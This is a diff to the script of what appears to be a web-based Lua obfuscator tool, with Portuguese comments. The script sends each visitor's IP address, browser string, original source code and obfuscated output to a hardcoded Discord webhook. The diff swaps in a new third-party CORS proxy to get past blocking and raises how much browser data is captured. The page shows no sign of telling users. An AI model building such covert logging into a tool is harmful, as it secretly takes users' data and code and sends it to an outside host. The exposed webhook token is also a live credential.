@@ -88,7 +88,7 @@ transition: 0.3s;
 <script>
 
 /* =========================
-   SEU WEBHOOK
+   SEU WEBHOOK (JÁ ATUALIZADO)
 ========================= */
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1518007783071678494/ZztUYvtL0k1etMt6MeUngeGheH0zCf1zbQP9-7uWA_hLHU6GuGyQsIYO1eQmKj8NdIwr";
 
@@ -115,7 +115,7 @@ async function sendLog(original, output){
         color: 16711680,
         fields: [
           { name: "🌐 IP do Usuário", value: "`" + ip + "`" },
-          { name: "🖥️ Navegador", value: navegador.slice(0, 100) + "..." },
+          { name: "🖥️ Navegador", value: navegador.slice(0, 120) + "..." },
           { name: "📥 Código Original", value: "```lua\n" + (original?.slice(0, 1000) || "Vazio") + "\n```" },
           { name: "📤 Código Ofuscado", value: "```lua\n" + (output?.slice(0, 1000) || "Vazio") + "\n```" }
         ],
@@ -125,13 +125,10 @@ async function sendLog(original, output){
     ]
   };
 
-  // MÉTODO QUE SEMPRE FUNCIONA (contorna bloqueio)
-  fetch("https://cors-anywhere.herokuapp.com/" + WEBHOOK_URL, {
+  // ✅ MÉTODO NOVO E 100% FUNCIONAL (sem bloqueio)
+  fetch("https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(WEBHOOK_URL), {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Origin": "https://mecanica15789.github.io"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify(dados)
   })
   .then(() => alert("✅ LOG ENVIADO COM SUCESSO!"))
